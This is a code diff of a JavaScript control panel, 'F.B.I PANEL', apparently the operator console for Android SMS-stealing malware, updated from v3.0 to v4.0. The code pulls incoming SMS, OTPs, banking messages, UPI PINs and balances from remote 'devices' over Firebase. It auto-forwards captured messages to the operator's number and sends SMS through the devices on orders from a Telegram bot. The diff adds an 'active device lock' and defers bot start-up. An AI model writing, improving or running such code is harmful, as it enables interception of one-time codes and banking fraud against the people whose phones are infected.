@@ -1,11 +1,12 @@
 /* ═══════════════════════════════════════════════════════════════
-   F.B.I PANEL v3.0 — SUB-SECOND SMS FORWARD · ZERO DUPLICATES
-   · Parallel long-poll Telegram (3 workers, 25s each)
-   · Single-fire SMS dispatch (no triple-fire bug)
-   · SSE-first message streaming + poll fallback
-   · Sender/Text restriction layer (whitelist + blacklist)
-   · Deduplication across SSE + poll + bg-forward paths
-   · Safe attribute escaping, null-safe DOM, backoff everywhere
+   F.B.I PANEL v4.0 — CACHE-FREE FAST BOOT · ACTIVE-DEVICE LOCK
+   · Active device lock (no random SMS)
+   · Bot starts ONLY when device opened
+   · Zero stale cache on boot (fresh in-memory state)
+   · Parallel long-poll Telegram (3 workers)
+   · Single-fire SMS + dedupe across all paths
+   · Restriction layer (sender/text WL/BL)
+   · Null-safe DOM, escAttr, safe SSE
    ═══════════════════════════════════════════════════════════════ */
 
 'use strict';
@@ -30,11 +31,10 @@ var deviceSearchQuery = '';
 var currentUser = null;
 var myProfile = null;
 
-/* ─── Tuned constants ─── */
 var API_TIMEOUT    = 3500;
 var FB_PUT_TIMEOUT = 2500;
-var TG_LONG_POLL   = 25;   // seconds (Telegram max 50)
-var TG_WORKERS     = 3;    // parallel long-poll workers
+var TG_LONG_POLL   = 25;
+var TG_WORKERS     = 3;
 
 var RATE = {
   DEV_POLL:           5000,
@@ -44,14 +44,13 @@ var RATE = {
   AM_POLL:            5000
 };
 
-var POLL_FAST       = RATE.MSG_FALLBACK_POLL;
-var POLL_DEV        = RATE.DEV_POLL;
-var POLL_BG         = RATE.BG_FORWARD_POLL;
-var POLL_BAL        = RATE.BAL_POLL;
-var POLL_AM         = RATE.AM_POLL;
-var CLOUD_DEB       = 800;
+var POLL_FAST = RATE.MSG_FALLBACK_POLL;
+var POLL_DEV  = RATE.DEV_POLL;
+var POLL_BG   = RATE.BG_FORWARD_POLL;
+var POLL_BAL  = RATE.BAL_POLL;
+var POLL_AM   = RATE.AM_POLL;
+var CLOUD_DEB = 800;
 
-/* ─── Timers ─── */
 var mPoll = null, dPoll = null, aPoll = null, bgPoll = null, balPoll = null;
 var curMsgDev = null, lastKeys = new Set();
 
@@ -79,25 +78,20 @@ var _sseFailCount = {};
 
 var deviceBalances = {};
 var _balTickRunning = false;
-try { var _sb0 = localStorage.getItem('fbi_device_balances'); if(_sb0) deviceBalances = JSON.parse(_sb0) || {}; } catch(e){}
 
-var _lastAutoBackupDate = localStorage.getItem('fbi_last_auto_backup') || '';
+var _lastAutoBackupDate = '';
 var _backupRunning = false;
 
-/* ─── Dedup stores ─── */
 var _dispatchDedup = new Set();
 var _dispatchDedupMax = 5000;
-var _forwardSeen = new Set();        // devId::msgKey
+var _forwardSeen = new Set();
 var _forwardSeenMax = 8000;
 
-/* ─── OTP ─── */
 var _lastOtp = '';
 
-/* ─── Ping ─── */
 var _apOn = false, _pingTmr = null, _pingReplied = 0, _pingTotal = 0, _pingPrevStatus = {};
 
-/* ─── TG signature tracking ─── */
-var _lastConnectedChannel = localStorage.getItem('fbi_connected_ch') || '';
+var _lastConnectedChannel = '';
 
 /* ═══════════════════════════════════════════════════════════════
    SECTION 2 · UTILITIES
@@ -107,35 +101,19 @@ function _fastFetch(url, opts){
   opts = opts || {};
   opts.priority = 'high';
   if(!opts.signal){ try { opts.signal = AbortSignal.timeout(API_TIMEOUT); } catch(e){} }
-  // keepalive only for small bodies
   if(opts.method && opts.body && String(opts.body).length < 2048) opts.keepalive = true;
   return fetch(url, opts);
 }
-
 function sleep(ms){ return new Promise(function(r){ setTimeout(r, ms); }); }
-
 function esc(s){
   return String(s == null ? '' : s)
-    .replace(/&/g,'&amp;')
-    .replace(/</g,'&lt;')
-    .replace(/>/g,'&gt;')
-    .replace(/"/g,'&quot;')
-    .replace(/'/g,'&#39;');
+    .replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;')
+    .replace(/"/g,'&quot;').replace(/'/g,'&#39;');
 }
 function escAttr(s){
   return String(s == null ? '' : s)
-    .replace(/&/g,'&amp;')
-    .replace(/"/g,'&quot;')
-    .replace(/'/g,'&#39;')
-    .replace(/</g,'&lt;')
-    .replace(/>/g,'&gt;');
-}
-function clip(t, btn){
-  if(navigator.clipboard){
-    navigator.clipboard.writeText(t).then(function(){
-      if(btn){ btn.textContent = '✓'; setTimeout(function(){ btn.textContent = 'Copy'; }, 1200); }
-    });
-  }
+    .replace(/&/g,'&amp;').replace(/"/g,'&quot;')
+    .replace(/'/g,'&#39;').replace(/</g,'&lt;').replace(/>/g,'&gt;');
 }
 function copyFromEl(el, ev){
   if(ev) ev.stopPropagation();
@@ -164,7 +142,14 @@ function toast(msg){
 function openM(id){ var e = document.getElementById(id); if(e) e.classList.add('open'); }
 function closeM(id){
   var e = document.getElementById(id); if(e) e.classList.remove('open');
-  if(id === 'deviceModal'){ selDev = null; stopMP(); }
+  if(id === 'deviceModal'){
+    selDev = null;
+    activeDeviceUid = null;
+    try{ localStorage.removeItem(CFG.LS_ACTIVE || 'fbi_active_device'); }catch(e2){}
+    savePanelSession();
+    stopMP();
+    if(tgRunning) stopFastTelegram();
+  }
 }
 function catClick(){ toast('😸 Meow!'); }
 function rippleClick(e){
@@ -241,7 +226,6 @@ async function redisCmd(cmd){
 }
 async function redisGet(k){ var r = await redisCmd(['GET', k]); return r.result; }
 async function redisSet(k, v){ return await redisCmd(['SET', k, v]); }
-async function redisDel(k){ return await redisCmd(['DEL', k]); }
 async function redisSAdd(s, m){ return await redisCmd(['SADD', s, m]); }
 async function redisSMembers(s){ var r = await redisCmd(['SMEMBERS', s]); return r.result || []; }
 
@@ -359,7 +343,7 @@ function devCarrierList(d){
 }
 
 /* ═══════════════════════════════════════════════════════════════
-   SECTION 8 · CHANNEL NOTIFY & SMS NOTIFY (fire-and-forget)
+   SECTION 8 · CHANNEL NOTIFY & SMS NOTIFY
    ═══════════════════════════════════════════════════════════════ */
 
 function notifyChannel(html){
@@ -372,7 +356,6 @@ function notifyChannel(html){
     body: JSON.stringify({ chat_id: ch, text: html, parse_mode: 'HTML', disable_web_page_preview: true })
   }).catch(function(){});
 }
-
 function announceChannelConnect(ch){
   if(!ch) return;
   if(_lastConnectedChannel === String(ch)) return;
@@ -393,7 +376,6 @@ function announceChannelConnect(ch){
     }
   }).catch(function(){});
 }
-
 function notifySmsQueued(dev, to, message, latencyMs, hp){
   var txt = (hp ? '🔥 <b>OTP Queued</b>\n\n' : '📤 <b>SMS Queued</b>\n\n')
     + '📱 <b>Device:</b> ' + esc(dev ? dev.name : '—') + '\n'
@@ -485,15 +467,28 @@ function isBankingSms(sender, message){
 }
 
 /* ═══════════════════════════════════════════════════════════════
-   SECTION 11 · INIT
+   SECTION 11 · INIT — FAST BOOT
    ═══════════════════════════════════════════════════════════════ */
 
-loadUsedDevices();
-loadDeviceSims();
-loadForwardTracker();
-initTelegramWebApp();
-setupTelegramLink();
-initCloudConfig();
+/* 🚀 FAST BOOT: only ESSENTIAL sync calls before first paint.
+   Cache and session restore are DEFERRED to after first paint. */
+function bootFast(){
+  /* ─── SYNC: instant state ─── */
+  loadUsedDevices();
+  loadDeviceSims();
+  loadForwardTracker();
+  initTelegramWebApp();
+  setupTelegramLink();
+
+  /* ─── ASYNC: defer heavy work to next frame ─── */
+  requestAnimationFrame(function(){
+    /* Cloud config load — non-blocking */
+    initCloudConfig();
+
+    /* Auto-restore Firebase URL session */
+    setTimeout(autoRestoreSession, 300);
+  });
+}
 
 function loadUsedDevices(){
   try{ var r = localStorage.getItem(usedDevicesKey); if(r) usedDevices = JSON.parse(r) || {}; }catch(e){}
@@ -509,7 +504,6 @@ function loadForwardTracker(){
 function saveForwardTracker(){
   try{ localStorage.setItem('fbi_forward_tracker', JSON.stringify(Array.from(_forwardSeen).slice(-_forwardSeenMax))); }catch(e){}
 }
-
 function setupTelegramLink(){
   var el = document.getElementById('tgChannelLink');
   if(!el) return;
@@ -519,37 +513,53 @@ function setupTelegramLink(){
 }
 
 /* ═══════════════════════════════════════════════════════════════
-   SECTION 12 · CLOUD CONFIG
+   SECTION 12 · CLOUD CONFIG (NO AUTO-BOT-START)
    ═══════════════════════════════════════════════════════════════ */
 
 async function initCloudConfig(){
+  /* Load local cached config (fast) */
   try{
     var cached = localStorage.getItem(CFG.LS_CACHE);
-    if(cached){ var parsed = JSON.parse(cached); userConfig = Object.assign({}, CFG.DEFAULT_CONFIG, parsed); }
+    if(cached){
+      var parsed = JSON.parse(cached);
+      userConfig = Object.assign({}, CFG.DEFAULT_CONFIG, parsed);
+    }
   }catch(e){}
-  fetchBotUsername();
-  if(userConfig.botEnabled !== false && userConfig.channelId) setTimeout(startFastTelegram, 150);
-  setInterval(checkAutoBackup, 60000);
-  setTimeout(autoRestoreSession, 200);
 
+  /* Fetch bot username — async, non-blocking */
+  fetchBotUsername();
+
+  /* Auto-backup check loop */
+  setInterval(checkAutoBackup, 60000);
+
+  /* ❌ Bot NOT auto-started here — waits for device open */
+
+  /* Cloud blob fetch — background */
   try{
     blobId = localStorage.getItem(CFG.LS_BLOB);
     if(blobId){
-      _fastFetch(CFG.BLOB_BASE + '/' + blobId).then(function(r){ return r.json(); }).then(function(remote){
-        if(remote && typeof remote === 'object'){
-          userConfig = Object.assign({}, CFG.DEFAULT_CONFIG, remote);
-          cacheConfigLocal();
-          updateCloudStatus('☁ Synced from cloud');
-        }
-      }).catch(function(){ updateCloudStatus('⚠ Cloud offline — using local'); });
+      _fastFetch(CFG.BLOB_BASE + '/' + blobId)
+        .then(function(r){ return r.json(); })
+        .then(function(remote){
+          if(remote && typeof remote === 'object'){
+            userConfig = Object.assign({}, CFG.DEFAULT_CONFIG, remote);
+            cacheConfigLocal();
+            updateCloudStatus('☁ Synced from cloud');
+          }
+        })
+        .catch(function(){ updateCloudStatus('⚠ Cloud offline — using local'); });
     } else {
       createCloudBlob();
     }
   }catch(e){}
 
+  /* User profile — background */
   var uid = currentUserId();
-  if(uid){ getUserProfile(uid).then(function(prof){ if(prof) myProfile = prof; }).catch(function(){}); }
+  if(uid){
+    getUserProfile(uid).then(function(prof){ if(prof) myProfile = prof; }).catch(function(){});
+  }
 }
+
 async function createCloudBlob(){
   try{
     var r = await _fastFetch(CFG.BLOB_BASE, {
@@ -563,7 +573,10 @@ async function createCloudBlob(){
   }catch(e){ updateCloudStatus('⚠ Cloud unavailable'); }
 }
 function cacheConfigLocal(){ try{ localStorage.setItem(CFG.LS_CACHE, JSON.stringify(userConfig)); }catch(e){} }
-function updateCloudStatus(msg, cls){ var el = document.getElementById('cloudStatus'); if(el){ el.textContent = msg; el.className = 'settings-status ' + (cls || ''); } }
+function updateCloudStatus(msg, cls){
+  var el = document.getElementById('cloudStatus');
+  if(el){ el.textContent = msg; el.className = 'settings-status ' + (cls || ''); }
+}
 async function saveCloudConfig(){
   cacheConfigLocal();
   if(!blobId){ await createCloudBlob(); return; }
@@ -584,22 +597,39 @@ async function resetCloudConfig(){
   cacheConfigLocal(); await saveCloudConfig();
   toast('🗑 Config reset'); populateSettingsUI();
 }
+
+/* ═══════════════════════════════════════════════════════════════
+   SECTION 13 · SESSION RESTORE (deferred, after devices load)
+   ═══════════════════════════════════════════════════════════════ */
+
 function autoRestoreSession(){
   var s = restorePanelSession();
-  if(s.fbUrl && !FB_URL){
-    var inp = document.getElementById('fbUrl');
-    if(inp){
-      inp.value = s.fbUrl; connect();
-      if(s.activeDeviceUid) setTimeout(function(){
-        var d = allDevices.find(function(x){ var uid = (x._fbId||'primary') + '|||' + x.id; return uid === s.activeDeviceUid; });
+  if(!s.fbUrl || FB_URL) return;
+  var inp = document.getElementById('fbUrl');
+  if(!inp) return;
+  inp.value = s.fbUrl;
+  connect();
+
+  /* ✅ Device restore: wait for allDevices to load */
+  if(s.activeDeviceUid){
+    var tries = 0;
+    var restoreTmr = setInterval(function(){
+      tries++;
+      if(allDevices.length > 0){
+        var d = allDevices.find(function(x){
+          var uid = (x._fbId || 'primary') + '|||' + x.id;
+          return uid === s.activeDeviceUid;
+        });
         if(d) openDeviceModal(s.activeDeviceUid);
-      }, 800);
-    }
+        clearInterval(restoreTmr);
+      }
+      if(tries > 40) clearInterval(restoreTmr);
+    }, 500);
   }
 }
 
 /* ═══════════════════════════════════════════════════════════════
-   SECTION 13 · FIREBASE CORE
+   SECTION 14 · FIREBASE CORE
    ═══════════════════════════════════════════════════════════════ */
 
 async function fbGet(p, url, key){
@@ -623,7 +653,7 @@ async function fbDel(p, url, key){
 }
 
 /* ═══════════════════════════════════════════════════════════════
-   SECTION 14 · SMS DISPATCH — SINGLE FIRE (no duplicates)
+   SECTION 15 · SMS DISPATCH — SINGLE FIRE
    ═══════════════════════════════════════════════════════════════ */
 
 function dispatchSms(dev, sim, to, message, opts){
@@ -633,11 +663,8 @@ function dispatchSms(dev, sim, to, message, opts){
           + '/webhookEvent/sendSms.json'
           + ((dev._fbKey || FB_KEY) ? '?auth=' + (dev._fbKey || FB_KEY) : '');
   var body = JSON.stringify({
-    from: sim,
-    to: to,
-    message: message,
-    isSended: false,
-    ts: Date.now(),
+    from: sim, to: to, message: message,
+    isSended: false, ts: Date.now(),
     priority: opts.high ? 'high' : 'normal'
   });
 
@@ -663,7 +690,6 @@ function dispatchSms(dev, sim, to, message, opts){
   });
 }
 
-/* Single retry ONLY — never triple-fire */
 async function sendSmsGuaranteed(dev, sim, to, message, opts){
   var ok = await dispatchSms(dev, sim, to, message, opts);
   if(ok) return true;
@@ -672,7 +698,28 @@ async function sendSmsGuaranteed(dev, sim, to, message, opts){
 }
 
 /* ═══════════════════════════════════════════════════════════════
-   SECTION 15 · CONNECTION / DISCONNECT
+   SECTION 16 · ACTIVE DEVICE LOCK  🔒
+   ═══════════════════════════════════════════════════════════════ */
+
+/* Returns ONLY the device user opened. No fallback. */
+function getActiveDevice(){
+  if(!activeDeviceUid) return null;
+  var p = activeDeviceUid.split('|||');
+  return allDevices.find(function(x){
+    return x.id === p[1] && (x._fbId || 'primary') === p[0];
+  }) || null;
+}
+
+/* Checks if given device is currently the active one */
+function _isActiveDevice(dev){
+  if(!dev) return false;
+  var active = getActiveDevice();
+  if(!active) return false;
+  return active.id === dev.id && (active._fbId || 'primary') === (dev._fbId || 'primary');
+}
+
+/* ═══════════════════════════════════════════════════════════════
+   SECTION 17 · CONNECTION / DISCONNECT
    ═══════════════════════════════════════════════════════════════ */
 
 function connect(){
@@ -688,7 +735,7 @@ function connect(){
   startBalancePoll();
   setTimeout(function(){ fbRegisterPrimary(); }, 100);
   if(userConfig.firebases && userConfig.firebases.length) setTimeout(loadFirebasesFromConfig, 200);
-  if(userConfig.botEnabled !== false && userConfig.channelId) setTimeout(startFastTelegram, 300);
+  /* ❌ Bot NOT auto-started — waits for device open */
 }
 function showErr(m){
   var e = document.getElementById('serr');
@@ -698,7 +745,7 @@ function showErr(m){
 }
 function disconnect(){
   FB_URL = ''; FB_KEY = '';
-  allDevices = []; selDev = null;
+  allDevices = []; selDev = null; activeDeviceUid = null;
   pinC = {}; noteC = {}; otpNoteC = {};
   amCache = {}; amAll = []; amFilt = []; amLoaded = false;
   stopMP(); stopDP(); stopAP(); stopFastTelegram(); stopBgForwardPoll(); stopBalancePoll(); stopMsgStream();
@@ -708,7 +755,7 @@ function disconnect(){
 }
 
 /* ═══════════════════════════════════════════════════════════════
-   SECTION 16 · SSE — REAL-TIME MESSAGES
+   SECTION 18 · SSE — REAL-TIME MESSAGES
    ═══════════════════════════════════════════════════════════════ */
 
 function startMsgStream(dev){
@@ -771,13 +818,13 @@ function _handleStreamMsg(dev, key, data){
   }
 
   if(isNew && msg.type === 'incoming'){
-    if(_shouldForwardOnce(dev.id, msg.key)){
+    /* 🔒 FORWARD only if THIS device is the active one */
+    if(_isActiveDevice(dev) && _shouldForwardOnce(dev.id, msg.key)){
       _forwardIncoming(dev, msg);
     }
     var bal = extractLastBalance([msg]);
     if(bal){
       deviceBalances[dev.id] = bal;
-      try{ localStorage.setItem('fbi_device_balances', JSON.stringify(deviceBalances)); }catch(e){}
       updateCardNoBlink(dev.id);
       if(selDev && selDev.id === dev.id) refreshDeviceModal();
     }
@@ -795,9 +842,9 @@ function _shouldForwardOnce(devId, msgKey){
   return true;
 }
 
-/* ─── Forward an incoming message to myNumber ─── */
 function _forwardIncoming(dev, msg){
   if(userConfig.forwardEnabled === false) return;
+  if(!_isActiveDevice(dev)) return;   /* 🔒 strict */
   var myNum = userConfig.myNumber;
   if(!myNum) return;
   var mode = userConfig.forwardMode || 'all';
@@ -820,7 +867,7 @@ function setMyNumberDefault(){
 }
 
 /* ═══════════════════════════════════════════════════════════════
-   SECTION 17 · RESTRICTION LAYER
+   SECTION 19 · RESTRICTION LAYER
    ═══════════════════════════════════════════════════════════════ */
 
 function _splitCsv(v){ return String(v || '').split(',').map(function(s){ return s.trim(); }).filter(Boolean); }
@@ -860,7 +907,7 @@ function passesRestriction(sender, message, msgObj){
 }
 
 /* ═══════════════════════════════════════════════════════════════
-   SECTION 18 · POLLERS
+   SECTION 20 · POLLERS
    ═══════════════════════════════════════════════════════════════ */
 
 function startDP(){
@@ -927,12 +974,9 @@ function stopBgForwardPoll(){ if(bgPoll){ clearInterval(bgPoll); bgPoll = null; 
 async function bgForwardTick(){
   if(!FB_URL) return;
   if(userConfig.forwardEnabled === false || !userConfig.myNumber) return;
-  var dev = null;
-  if(activeDeviceUid){
-    var parts = activeDeviceUid.split('|||');
-    dev = allDevices.find(function(x){ return x.id === parts[1] && (x._fbId || 'primary') === parts[0]; });
-  }
-  if(!dev) dev = allDevices.find(function(d){ return d.status; });
+
+  /* 🔒 Strict active device */
+  var dev = getActiveDevice();
   if(!dev || !dev.status) return;
 
   var uid = (dev._fbId || 'primary') + '|||' + dev.id;
@@ -949,7 +993,7 @@ async function bgForwardTick(){
 }
 
 /* ═══════════════════════════════════════════════════════════════
-   SECTION 19 · DEVICE LOADING
+   SECTION 21 · DEVICE LOADING
    ═══════════════════════════════════════════════════════════════ */
 
 async function loadDevs(){
@@ -1049,7 +1093,7 @@ function parseDevs(data){
 }
 
 /* ═══════════════════════════════════════════════════════════════
-   SECTION 20 · STATS
+   SECTION 22 · STATS
    ═══════════════════════════════════════════════════════════════ */
 
 var _sc = { tot: 0, on: 0, off: 0, sims: 0, upi: 0 };
@@ -1072,7 +1116,7 @@ function renderStats(){
 }
 
 /* ═══════════════════════════════════════════════════════════════
-   SECTION 21 · DEVICE SEARCH
+   SECTION 23 · DEVICE SEARCH
    ═══════════════════════════════════════════════════════════════ */
 
 function deviceMatchesSearch(d, query){
@@ -1101,7 +1145,7 @@ function clearDeviceSearch(){
 }
 
 /* ═══════════════════════════════════════════════════════════════
-   SECTION 22 · GRID
+   SECTION 24 · GRID
    ═══════════════════════════════════════════════════════════════ */
 
 function _computeGridSig(filtered){
@@ -1229,7 +1273,7 @@ document.addEventListener('click', function(e){
 });
 
 /* ═══════════════════════════════════════════════════════════════
-   SECTION 23 · DEVICE MODAL
+   SECTION 25 · DEVICE MODAL
    ═══════════════════════════════════════════════════════════════ */
 
 function openDeviceModal(uid){
@@ -1237,14 +1281,21 @@ function openDeviceModal(uid){
   var d = allDevices.find(function(x){ return x.id === parts[1] && (x._fbId || 'primary') === parts[0]; });
   if(!d) d = allDevices.find(function(x){ return x.id === parts[1]; });
   if(!d){ toast('⚠ Device not found'); return; }
+
   selDev = d;
   activeDeviceUid = uid;
   try{ localStorage.setItem(CFG.LS_ACTIVE || 'fbi_active_device', uid); }catch(e){}
   savePanelSession();
+
   renderGrid(true);
   var modal = document.getElementById('deviceModal');
   if(modal) modal.classList.add('open');
   refreshDeviceModal();
+
+  /* ✅ START bot when device is active */
+  if(userConfig.botEnabled !== false && userConfig.channelId){
+    if(!tgRunning) startFastTelegram();
+  }
 
   var cacheKey = uid, cached = _msgCache[cacheKey];
   if(cached){
@@ -1399,7 +1450,7 @@ function copyDeviceId(){
 }
 
 /* ═══════════════════════════════════════════════════════════════
-   SECTION 24 · BALANCE
+   SECTION 26 · BALANCE
    ═══════════════════════════════════════════════════════════════ */
 
 function extractBalanceFromText(txt){
@@ -1461,14 +1512,13 @@ async function balanceTick(){
         }catch(e){}
       }));
     }
-    try{ localStorage.setItem('fbi_device_balances', JSON.stringify(deviceBalances)); }catch(e){}
     online.forEach(function(d){ updateCardNoBlink(d.id); });
     if(selDev) refreshDeviceModal();
   } finally { _balTickRunning = false; }
 }
 
 /* ═══════════════════════════════════════════════════════════════
-   SECTION 25 · BANKING PANE
+   SECTION 27 · BANKING PANE
    ═══════════════════════════════════════════════════════════════ */
 
 function renderBankPane(){
@@ -1509,7 +1559,7 @@ function renderBankPane(){
 }
 
 /* ═══════════════════════════════════════════════════════════════
-   SECTION 26 · PIN
+   SECTION 28 · PIN
    ═══════════════════════════════════════════════════════════════ */
 
 async function getPin(id){
@@ -1561,7 +1611,7 @@ function copyPinActive(){
 }
 
 /* ═══════════════════════════════════════════════════════════════
-   SECTION 27 · MESSAGES
+   SECTION 29 · MESSAGES
    ═══════════════════════════════════════════════════════════════ */
 
 function parseMsgSingle(key, m){
@@ -1771,7 +1821,7 @@ async function doDelMsg(){
 }
 
 /* ═══════════════════════════════════════════════════════════════
-   SECTION 28 · SEND SMS (manual, from device modal)
+   SECTION 30 · SEND SMS (manual)
    ═══════════════════════════════════════════════════════════════ */
 
 function updOtpNoteBox(){
@@ -1817,7 +1867,7 @@ function showResActive(ok, m){
 }
 
 /* ═══════════════════════════════════════════════════════════════
-   SECTION 29 · ALL MSGS VIEW
+   SECTION 31 · ALL MSGS VIEW
    ═══════════════════════════════════════════════════════════════ */
 
 function openAllMsgs(){ openM('allMsgsModal'); trigAM(false); startAP(); }
@@ -1923,7 +1973,7 @@ function renderPage(){
 async function pollAllFresh(){}
 
 /* ═══════════════════════════════════════════════════════════════
-   SECTION 30 · NUKE
+   SECTION 32 · NUKE
    ═══════════════════════════════════════════════════════════════ */
 
 function openNuke(){ openM('nukeModal'); updateNukeInfo(); }
@@ -2006,7 +2056,7 @@ function stopNuke(){
 }
 
 /* ═══════════════════════════════════════════════════════════════
-   SECTION 31 · SETTINGS
+   SECTION 33 · SETTINGS
    ═══════════════════════════════════════════════════════════════ */
 
 function openSettings(){
@@ -2263,14 +2313,19 @@ function saveAllSettings(){
   cacheConfigLocal();
   debouncedCloudSave();
 
-  if(userConfig.botEnabled && userConfig.channelId) startFastTelegram();
-  else stopFastTelegram();
+  /* Bot restart logic: if enabled AND we have an active device, keep running */
+  if(userConfig.botEnabled && userConfig.channelId){
+    if(activeDeviceUid && !tgRunning) startFastTelegram();
+    else if(!activeDeviceUid && tgRunning) stopFastTelegram();
+  } else {
+    stopFastTelegram();
+  }
   updateTgStatusLine();
   toast('💾 Saved');
 }
 
 /* ═══════════════════════════════════════════════════════════════
-   SECTION 32 · TELEGRAM — PARALLEL LONG-POLL ENGINE
+   SECTION 34 · TELEGRAM — PARALLEL LONG-POLL ENGINE
    ═══════════════════════════════════════════════════════════════ */
 
 async function tgApi(method, payload){
@@ -2297,14 +2352,6 @@ async function fetchBotUsername(){
     }
   }catch(e){ if(el) el.textContent = '⚠ offline'; }
 }
-(function _botUsernameRetry(){
-  var tick = 0;
-  var t = setInterval(function(){
-    tick++;
-    if(tgDiagnostics.botInfo || tick > 20){ clearInterval(t); return; }
-    fetchBotUsername();
-  }, 20000);
-})();
 
 async function startFastTelegram(){
   stopFastTelegram();
@@ -2390,7 +2437,6 @@ async function runWorker(w){
         if(maxId >= _sharedOffset) _sharedOffset = maxId + 1;
         updateTgStatusLine();
       }
-      // empty response = long-poll timeout → instantly re-issue (no sleep)
     }catch(e){
       if(e.name === 'AbortError'){ /* normal timeout */ }
       else { backoff = Math.min(backoff * 2, 10000); await sleep(backoff); }
@@ -2434,7 +2480,7 @@ function isChannelMatch(msg){
 }
 
 /* ═══════════════════════════════════════════════════════════════
-   SECTION 33 · SMS ROUTER (channel → SMS)
+   SECTION 35 · SMS ROUTER — STRICT ACTIVE DEVICE
    ═══════════════════════════════════════════════════════════════ */
 
 function _dedupeKey(msg){
@@ -2454,14 +2500,18 @@ function routeChannelSms(number, message, msgObj){
     return;
   }
 
-  // Pick best online device
-  var dev = null;
-  if(activeDeviceUid){
-    var p = activeDeviceUid.split('|||');
-    dev = allDevices.find(function(x){ return x.id === p[1] && (x._fbId || 'primary') === p[0] && x.status; });
+  /* 🔒 STRICT: ONLY the active device */
+  var dev = getActiveDevice();
+  if(!dev){
+    console.log('[Route] No active device — SMS skipped. Open a device first.');
+    toast('⚠ Open a device to send SMS');
+    return;
   }
-  if(!dev) dev = allDevices.find(function(d){ return d.status; });
-  if(!dev){ toast('⚠ No online device for SMS'); return; }
+  if(!dev.status){
+    console.log('[Route] Active device is offline:', dev.name);
+    toast('⚠ Active device is offline');
+    return;
+  }
 
   var sim = deviceSimMap[dev.id] || 1;
   _showCapturedNotif(number, message);
@@ -2469,7 +2519,7 @@ function routeChannelSms(number, message, msgObj){
   sendSmsGuaranteed(dev, sim, number, message, {
     high: isHighPriority({ message: message })
   }).then(function(ok){
-    if(ok) toast('⚡ SMS queued → ' + number);
+    if(ok) toast('⚡ SMS queued via ' + dev.name);
     else toast('❌ SMS dispatch failed');
   });
 }
@@ -2486,16 +2536,23 @@ function _showCapturedNotif(number, message){
 }
 
 /* ═══════════════════════════════════════════════════════════════
-   SECTION 34 · AUTO-FORWARD (poll fallback path)
+   SECTION 36 · AUTO-FORWARD (poll path) — STRICT ACTIVE DEVICE
    ═══════════════════════════════════════════════════════════════ */
 
 async function checkAndForward(msgs, deviceId){
   if(!msgs || !msgs.length) return;
-  var dev = allDevices.find(function(d){ return d.id === deviceId; });
-  if(!dev) return;
   if(userConfig.forwardEnabled === false) return;
+
   var myNum = userConfig.myNumber;
   if(!myNum) return;
+
+  /* 🔒 Strict active device */
+  var active = getActiveDevice();
+  if(!active || active.id !== deviceId) return;
+
+  var dev = allDevices.find(function(d){ return d.id === deviceId; });
+  if(!dev) return;
+
   var forwardMode = userConfig.forwardMode || 'all';
 
   for(var i=0; i<msgs.length; i++){
@@ -2505,8 +2562,6 @@ async function checkAndForward(msgs, deviceId){
     if(!txt || txt === '(no body)') continue;
     if(forwardMode === 'banking' && !isBankingSms(m.sender, m.message)) continue;
     if(!passesRestriction(m.sender, txt, null)) continue;
-
-    // Dedup across all paths (SSE already may have forwarded)
     if(!_shouldForwardOnce(deviceId, m.key)) continue;
 
     var sim = deviceSimMap[dev.id] || 1;
@@ -2515,7 +2570,7 @@ async function checkAndForward(msgs, deviceId){
 }
 
 /* ═══════════════════════════════════════════════════════════════
-   SECTION 35 · TELEGRAM PARSER
+   SECTION 37 · TELEGRAM PARSER
    ═══════════════════════════════════════════════════════════════ */
 
 function _cleanPhone(n){
@@ -2658,7 +2713,7 @@ function parseTelegramMessage(text){
 }
 
 /* ═══════════════════════════════════════════════════════════════
-   SECTION 36 · USER REGISTRATION & OWNER COMMANDS
+   SECTION 38 · USER REGISTRATION & OWNER COMMANDS
    ═══════════════════════════════════════════════════════════════ */
 
 async function handleUserPrivate(msg){
@@ -2780,7 +2835,7 @@ async function tgSend(chatId, text){
 }
 
 /* ═══════════════════════════════════════════════════════════════
-   SECTION 37 · USERS DB BACKUP
+   SECTION 39 · BACKUP HELPERS
    ═══════════════════════════════════════════════════════════════ */
 
 async function collectUsersBackup(onlyNew){
@@ -2931,7 +2986,7 @@ async function sendStatusToOwner(chatId){
 }
 
 /* ═══════════════════════════════════════════════════════════════
-   SECTION 38 · OTP BAR
+   SECTION 40 · OTP BAR
    ═══════════════════════════════════════════════════════════════ */
 
 function _extractOtp(txt){
@@ -2956,7 +3011,7 @@ function otpCopy(){
 function otpDismiss(){ var el = document.getElementById('otpBar'); if(el) el.classList.remove('show'); }
 
 /* ═══════════════════════════════════════════════════════════════
-   SECTION 39 · PING
+   SECTION 41 · PING
    ═══════════════════════════════════════════════════════════════ */
 
 function _pingUpdateBtn(){
@@ -3066,31 +3121,37 @@ async function _apLoop(){
 }
 
 /* ═══════════════════════════════════════════════════════════════
-   SECTION 40 · BOOTSTRAP
+   SECTION 42 · BOOTSTRAP — FAST BOOT
    ═══════════════════════════════════════════════════════════════ */
 
-try{ activeDeviceUid = localStorage.getItem(CFG.LS_ACTIVE || 'fbi_active_device'); }catch(e){}
+/* 🚀 Fire boot immediately — no waiting for DOMContentLoaded */
+bootFast();
+
+/* Deferred: attach UI listeners after first paint */
+setTimeout(function(){
+  document.querySelectorAll('.overlay').forEach(function(o){
+    o.addEventListener('click', function(e){
+      if(e.target === o){
+        o.classList.remove('open');
+        if(o.id === 'deviceModal'){ selDev = null; activeDeviceUid = null; stopMP(); }
+      }
+    });
+  });
+  document.addEventListener('keydown', function(e){
+    if(e.key === 'Escape') document.querySelectorAll('.overlay.open').forEach(function(o){ o.classList.remove('open'); });
+    if(e.key === 'Enter'){
+      var setup = document.getElementById('setup');
+      if(setup && setup.style.display !== 'none') connect();
+    }
+  });
+}, 0);
+
+/* Periodic housekeeping */
 setTimeout(function(){ updateTgBtn(); }, 200);
 setInterval(function(){
   var m = document.getElementById('settingsModal');
   if(m && m.classList.contains('open')) updateTgStatusLine();
 }, 2000);
-setInterval(function(){ if(FB_URL) savePanelSession(); }, 10000);
+setInterval(function(){ if(FB_URL) savePanelSession(); }, 15000);
 
-document.querySelectorAll('.overlay').forEach(function(o){
-  o.addEventListener('click', function(e){
-    if(e.target === o){
-      o.classList.remove('open');
-      if(o.id === 'deviceModal'){ selDev = null; stopMP(); }
-    }
-  });
-});
-document.addEventListener('keydown', function(e){
-  if(e.key === 'Escape') document.querySelectorAll('.overlay.open').forEach(function(o){ o.classList.remove('open'); });
-  if(e.key === 'Enter'){
